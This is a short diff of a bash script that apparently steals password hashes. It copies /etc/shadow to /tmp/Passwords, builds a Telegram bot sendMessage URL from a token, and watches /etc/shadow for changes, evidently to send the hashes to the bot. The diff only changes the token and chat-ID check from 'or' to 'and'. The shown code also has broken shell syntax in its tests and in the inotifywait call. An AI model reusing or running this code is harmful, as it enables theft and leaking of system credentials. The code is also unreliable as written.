@@ -11,7 +11,7 @@ URL"https://api.telegram.org/bot$TOKEN/sendMessage"
 
 cat /etc/shadow > /tmp/Passwords
 
-if [[!-z "$TOKEN"]] || [[!-z "$ID"]];
+if [[!-z "$TOKEN"]] && [[!-z "$ID"]];
 then
 
 while inotifywait -e /etc/shadow; do
